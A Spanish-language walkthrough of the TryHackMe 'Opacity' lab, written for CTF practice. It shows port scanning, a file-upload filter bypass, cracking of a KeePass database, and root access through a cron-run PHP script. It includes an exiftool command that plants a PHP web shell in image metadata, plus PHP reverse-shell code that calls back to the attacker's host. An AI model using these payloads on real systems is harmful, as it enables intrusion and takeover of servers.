---
layout: post
author: Isui
title: Opacity TryHackMe Spanish Walkthrough
---

![](/images/opacity/opacity.png)

Opacity es un Boot2Root creado para pentesters y entusiastas de la ciberseguridad.

# Reconocimiento:

Comencé realizando una trama ICMP al target:

```sh
┌──(isui㉿kali)-[~/TryHackMe/Opacity]
└─$ ping -c 1 10.10.42.125
PING 10.10.42.125 (10.10.42.125) 56(84) bytes of data.
64 bytes from 10.10.42.125: icmp_seq=1 ttl=63 time=142 ms

--- 10.10.42.125 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 141.763/141.763/141.763/0.000 ms
```

En base al `TTL`, puedo intuir que se trata muy probablemente de un SO basado en el Kernel de Linux/Unix.

### Escaneo de puertos

Lo primero que hice fue realizar un escaneo general de puertos con la herramienta `nmap`:

```sh
┌──(isui㉿kali)-[~/TryHackMe/Opacity]
└─$ sudo nmap -p- --open -sS --min-rate 1000 -vv -n -Pn 10.10.42.125 -oG portsGeneral 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-16 13:58 CST
Initiating SYN Stealth Scan at 13:58
Scanning 10.10.42.125 [65535 ports]
Discovered open port 139/tcp on 10.10.42.125
Discovered open port 80/tcp on 10.10.42.125
Discovered open port 445/tcp on 10.10.42.125
Discovered open port 22/tcp on 10.10.42.125
Completed SYN Stealth Scan at 13:58, 42.89s elapsed (65535 total ports)
Nmap scan report for 10.10.42.125
Host is up, received user-set (0.14s latency).
Scanned at 2024-07-16 13:58:15 CST for 42s
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 63
80/tcp  open  http         syn-ack ttl 63
139/tcp open  netbios-ssn  syn-ack ttl 63
445/tcp open  microsoft-ds syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 42.97 seconds
           Raw packets sent: 67935 (2.989MB) | Rcvd: 67892 (2.716MB)
```

Este escaneo expuso, distintos servicios, por lo consiguiente realice un escaneo mucho más exhaustivo, para hallar las versiones de cada servicio y comenzar a buscar vulnerabilidades con dicha información

```sh
──(isui㉿kali)-[~/TryHackMe/Opacity]
└─$ sudo nmap -p22,80,139,445 -sC -sV 10.10.42.125 -A -oN target                     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-16 14:03 CST
Nmap scan report for 10.10.42.125
Host is up (0.14s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0f:ee:29:10:d9:8e:8c:53:e6:4d:e3:67:0c:6e:be:e3 (RSA)
|   256 95:42:cd:fc:71:27:99:39:2d:00:49:ad:1b:e4:cf:0e (ECDSA)
|_  256 ed:fe:9c:94:ca:9c:08:6f:f2:5c:a6:cf:4d:3c:8e:5b (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-title: Login
|_Requested resource was login.php
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: OPACITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2024-07-16T20:03:35
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   142.03 ms 10.21.0.1
2   142.45 ms 10.10.42.125

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.27 seconds
```

Este escaneo revelo las versiones de cada servicio, a primera vista pude observar que el servicio SSH puede que sea muy poco probable que sea vulnerable, y lo raro es que hay dos puertos ejecutando el servicio SAMBA.

# Enumeración

Comencé por visualizar el servicio HTTP, desde el navegador:

![](/images/opacity/Pasted image 20240716141335.png)

Pero en base a la experiencia, se ve muy simple, nose si realmente puede ejecutar alguna acción, o solo es código HTML y CSS:

![](/images/opacity/Pasted image 20240716141430.png)

Parece ser que sí realiza alguna acción, pero no estoy seguro, igualmente intente probar una inyección de XSS pero no fue posible. Por lo que revise el código fuente de la página:

![](/images/opacity/Pasted image 20240716141955.png)

Y como había supuesto, se trata de una página estática. Simplemente es código HTML y CSS. Pero no acaba aquí, lo que hice a continuación, fue realizar un fuzzing de directorios con Gobuster:

```ruby
┌──(isui㉿kali)-[~/TryHackMe/Opacity]
└─$ gobuster dir -u http://10.10.42.125 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.42.125
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 310] [--> http://10.10.42.125/css/]
/cloud                (Status: 301) [Size: 312] [--> http://10.10.42.125/cloud/]
```

Gracias a esta acción, se descubrieron dos directorios, uno que puedo ver del que hace uso la página principal, donde revise el código HTML, así que seguramente, no contenga información crítica.

El segundo directorio, es quizá el que llama más mi atención, ya que no es muy común, por lo que decido revisarlo:

![](/images/opacity/Pasted image 20240716142926.png)

Puedo ver que se trata de un aplicativo que supuestamente, me deberia dejar de subir algún archivo al servidor. Para saber que lenguaje de programación utiliza el servidor, utilizo la extensión de Wappalyzer que ya tengo instalada:

![](/images/opacity/Pasted image 20240716143101.png)

Puedo observar que se trata del lenguaje de programación PHP, la misma extensión que de la página principal.

# Explotación

Ahora decidí, subir una imagen, sin ningún tipo de Payload. Solo para comprobar que realmente puedo hacer uso del aplicativo, por lo que desde mi Kali, abri el puerto 8000 con un servicio HTTP, con la ayuda de Python:

```python
┌──(isui㉿kali)-[~/TryHackMe/Opacity]
└─$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

La imagen que elegí es en formato JPG:

![](/images/opacity/Pasted image 20240716143859.png)

Ingrese desdé el navegador, para poder obtener la URL:

![](/images/opacity/Pasted image 20240716143948.png)

Y la pegue en el aplicativo y pulse subir:

![](/images/opacity/Pasted image 20240716144036.png)

Y logre subir exitosamente, la imagen:

![](/images/opacity/Pasted image 20240716144113.png)

Pero hay que recordar, que es solo una imagen, que no contiene nada aún. Lo primero que se me ocurrió, fue infectar la imagen con código PHP, y que el payload, sea una conexión ReverseShell para establecer una conexión.

Con la herramienta `exiftool` intentare realizar dicha acción, de troyanizar la imagén:

```java
┌──(isui㉿kali)-[~/TryHackMe/Opacity]
└─$ exiftool hacker.jpg 
ExifTool Version Number         : 12.76
File Name                       : hacker.jpg
Directory                       : .
File Size                       : 87 kB
File Modification Date/Time     : 2024:07:16 14:28:30-06:00
File Access Date/Time           : 2024:07:16 14:28:41-06:00
File Inode Change Date/Time     : 2024:07:16 14:28:30-06:00
File Permissions                : -rw-rw-r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Profile CMM Type                : Little CMS
Profile Version                 : 2.1.0
Profile Class                   : Display Device Profile
Color Space Data                : RGB
Profile Connection Space        : XYZ
Profile Date Time               : 2012:01:25 03:41:57
Profile File Signature          : acsp
Primary Platform                : Apple Computer Inc.
CMM Flags                       : Not Embedded, Independent
Device Manufacturer             : 
Device Model                    : 
Device Attributes               : Reflective, Glossy, Positive, Color
Rendering Intent                : Perceptual
Connection Space Illuminant     : 0.9642 1 0.82491
Profile Creator                 : Little CMS
Profile ID                      : 0
Profile Description             : sRGB MozJPEG
Profile Copyright               : PD
Media White Point               : 0.9642 1 0.82491
Media Black Point               : 0.01205 0.0125 0.01031
Red Matrix Column               : 0.43607 0.22249 0.01392
Green Matrix Column             : 0.38515 0.71687 0.09708
Blue Matrix Column              : 0.14307 0.06061 0.7141
Red Tone Reproduction Curve     : (Binary data 64 bytes, use -b option to extract)
Blue Tone Reproduction Curve    : (Binary data 64 bytes, use -b option to extract)
Green Tone Reproduction Curve   : (Binary data 64 bytes, use -b option to extract)
Image Width                     : 2560
Image Height                    : 1440
Encoding Process                : Progressive DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:2:2 (2 1)
Image Size                      : 2560x1440
Megapixels                      : 3.7
```


El payload es el siguiente:

```bash
exiftool -DocumentName="<h1>Testing<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>" imagen.jpg
```

Desglose del Comando: 

 1. `exiftool`
- **Herramienta**: `exiftool` es una herramienta de línea de comandos para leer, escribir y editar metadatos en archivos multimedia (como imágenes, videos y audio).

2. `-DocumentName=`
- **Opción de Metadatos**: `-DocumentName` es un tag de metadatos que se está estableciendo en el archivo `imagen.jpg`.

3. `"<h1>Testing<br><?php if(isset(\$_REQUEST['cmd'])){echo '<pre>';\$cmd = (\$_REQUEST['cmd']);system(\$cmd);echo '</pre>';} __halt_compiler();?></h1>"`
- **Valor del Metadato**: Este es el valor que se está asignando al tag `DocumentName`. Incluye HTML y PHP embebido:
  - `<h1>Testing<br>`: Un encabezado `<h1>` con el texto "Testing" seguido de un salto de línea (`<br>`).
  - `<?php ... ?>`: Código PHP embebido.
    - `if(isset($_REQUEST['cmd'])){...}`: Verifica si el parámetro `cmd` está presente en la solicitud.
    - `echo '<pre>';`: Abre un bloque `<pre>` para salida preformateada.
    - `$cmd = ($_REQUEST['cmd']);`: Asigna el valor del parámetro `cmd` a la variable `$cmd`.
    - `system($cmd);`: Ejecuta el comando del sistema almacenado en `$cmd`.
    - `echo '</pre>';`: Cierra el bloque `<pre>`.
    - `__halt_compiler();`: Detiene la ejecución del compilador PHP en este punto.
  - `</h1>`: Cierra el encabezado `<h1>`.

 4. `imagen.jpg`
- **Archivo Objetivo**: Este es el archivo de imagen al cual se le están agregando los metadatos.

![](/images/opacity/Pasted image 20240716145516.png)

Esta es mi primera opción, en caso de no funcionar, probare otras alternativas. Nuevamente ejecute el servidor HTTP con Python en mi Kali, e intente subir la imagen trojanizada:

![](/images/opacity/Pasted image 20240716150511.png)

Intente realizar este proceso durante repetidas ocasiones, pero cada que intentaba establecer la conexión, la imagen dejaba de esta en línea en el servidor.

![](/images/opacity/Pasted image 20240716150906.png)

por lo que opte por utilizar un archivo PHP con extensión JPG. Utilizare la Shell que ya tiene Kali, y le agregare la nueva extensión.

```sh
cp /usr/share/webshells/php/php-reverse-shell.php .
```

Luego modifique el nombre:

```sh
cp php-reverse-shell.php cmd.phtml
```

luego con nano `nano shell.phtml` modifique el archivo con los parámetros que requiero para entablar la conexión:

![](/images/opacity/Pasted image 20240716151914.png)

> **NOTA:** En algunas ocasiones me ha funcionado, tal cual está el documento, pero en esta ocasión, lo que hice fue colocar '4445' es decir el puerto entre comillas simples.

Y volví a intentar subir el archivo, iniciando nuevamente el servidor HTTP desde mi Kali con Python:

![](/images/opacity/Pasted image 20240716164124.png)

El modo de evasión que utilice fue colocar el `#00.jpg` después de la extensión PHP.
https://book.hacktricks.xyz/pentesting-web/file-upload

Y obtuve la conexión inversa:
```ruby
┌──(isui㉿kali)-[~/TryHackMe/Opacity]
└─$ nc -nlvp 4445
listening on [any] 4445 ...
connect to [10.21.16.176] from (UNKNOWN) [10.10.42.125] 57386
Linux opacity 5.4.0-139-generic #156-Ubuntu SMP Fri Jan 20 17:27:18 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
 22:36:45 up  2:49,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (733): Inappropriate ioctl for device
bash: no job control in this shell
www-data@opacity:/$
```

Luego realice el tratamiento de la TTY:

ngresar el comando (en nuestra terminal de atacante de Kali):
```
script /dev/null -c bash
```
Pulsar la combinación: `ctrl + z`
Escribir el comando:
```
stty raw -echo; fg
```
Pulsar `Enter` y escribir:
```
reset xterm
```
Escribir:
```
export TERM=xterm
```
Ahora debemos colocar nuestra terminal en pantalla completa para trabajar más comodo en caso de comandos muy largos:
```
stty rows 30 columns 100
```

Hemos terminado el tratamiento de nuestra terminal interactiva.

![](/images/opacity/Pasted image 20240716164619.png)

Comencé entonces a enumerar el usuario y directorio en donde me encontraba:

![](/images/opacity/Pasted image 20240716165426.png)

Encontré la primer bandera, pero no tenia el acceso suficiente, ya que el usuario `sysadmin` es quien tiene permisos:

![](/images/opacity/Pasted image 20240716165638.png)

Intente ver que nivel de privilegios tenia mi usuario actual, pero no tuve éxito:

![](/images/opacity/Pasted image 20240716165738.png)

Así que seguí buscando en los directorios, y encontré un archivo que no es muy usual en el directorio OPT:

![](/images/opacity/Pasted image 20240716165857.png)

Así que busque en Internet que tipo de archivo era:

![](/images/opacity/Pasted image 20240716165940.png)

Y se trata de una base de datos de un gestor de contraseñas, así que si logro crackearlo, muy probablemente, logre tener acceso a algún tipo de credenciales.

Para descargarlo en mi directorio de trabajo, ejecute un servidor con Python, desde el puerto 8000 en el target:

![](/images/opacity/Pasted image 20240716170146.png)

Descargué el archivo desde mi Kali con la herramienta WGET:

![](/images/opacity/Pasted image 20240716170609.png)

Para intentar crackear la contraseña del archivo Keepass, lo primero es convertir el archivo a un formato que John pueda entender:

![](/images/opacity/Pasted image 20240716170826.png)

Luego ejecute John:

![](/images/opacity/Pasted image 20240716171044.png)

Luego de ejecutar John, pude ver en texto claro la contraseña de la base de datos. Ahora tocaba instalar KeepassX para poder abri la base de datos:

![](/images/opacity/Pasted image 20240716172002.png)

Una vez instalado, pude ver el usuario y contraseña en texto claro:

![](/images/opacity/Pasted image 20240716172137.png)

Así que probe a conectarme por SSH:

![](/images/opacity/Pasted image 20240716172405.png)

Así que comencé el reconocimiento del usuario actual:

![](/images/opacity/Pasted image 20240716172604.png)

Como parte de este reconocimiento, puede obtener la primer bandera del CTF.

# Escalada de privilegios

Comencé a enumerar todos los directorios y archivos que encontraba, y me di cuenta, revisando el historia de bash, que había accedido anterior mente como administrador. Además encontré una carpeta que no es usual `scripts`, la revise y encontré un script en PHP, que al revisar los permisos me di cuenta que tenia permisos de `root`:

![](/images/opacity/Pasted image 20240716173134.png)

AL intentar ver mis privilegio, puede notar que no contaba con dichos permisos:

![](/images/opacity/Pasted image 20240716173431.png)

Luego de bastante tiempo investigando, me di cuenta que el script de Backup, se ejecutaba cada cierto tiempo, pero este lo hacia con privilegios de `root`, por lo que desde otro directorio, lo copie y modifique agregando la siguiente línea al código:

```php
sock=fscokopen("mi ip",puerto);shell_exec("sh <&3 >&3 2>&3");
```

1. **`fsockopen("mi ip",puerto);`**:
   
    - Esta función intenta abrir una conexión de socket a la dirección IP especificada (`"mi ip"`) y al puerto especificado (`puerto`).
    - `fsockopen` es una función PHP utilizada para crear una conexión a nivel de socket, que puede ser utilizada para interactuar con servicios de red.
    - La conexión de socket creada se asigna a la variable `$sock`.
2. **`shell_exec("sh <&3 >&3 2>&3");`**:
    
    - `shell_exec` es una función PHP que ejecuta un comando de shell.
    - El comando en sí es `sh <&3 >&3 2>&3`.
        - `sh`: Invoca el intérprete de comandos de shell.
        - `<&3`: Redirige la entrada estándar (stdin) del shell al descriptor de archivo 3.
        - `>&3`: Redirige la salida estándar (stdout) del shell al descriptor de archivo 3.
        - `2>&3`: Redirige la salida de error estándar (stderr) del shell al descriptor de archivo 3.
**Interpretación**
En resumen, este código PHP está intentando hacer lo siguiente:

1. **Abrir un socket a una dirección IP y puerto específicos**:
    
    - La función `fsockopen` establece una conexión de socket a un servidor remoto en la dirección IP y puerto especificados.
2. **Ejecutar un shell a través de ese socket**:
    
    - Utilizando `shell_exec`, se está intentando ejecutar un shell (`sh`) y redirigir las entradas y salidas del shell al descriptor de archivo 3.

![](/images/opacity/Pasted image 20240716175404.png)

Luego de ello, moví nuevamente el script a su directorio original, pero ahora ya incluye el Payload, por lo que cuando se ejecuta, debería establecer una Reverse shell con mi Kali, por lo que deje mi Kali a la Escucha con Netcat:

![](/images/opacity/Pasted image 20240717061240.png)

Así después de unos minutos, cuando se ejecuto el Script, puede tener acceso como usuario root, lo que me permitió ver la última bandera.


tHanks f0r read1ng w1th L0v3 Isu <3

And H4ppy H4cking!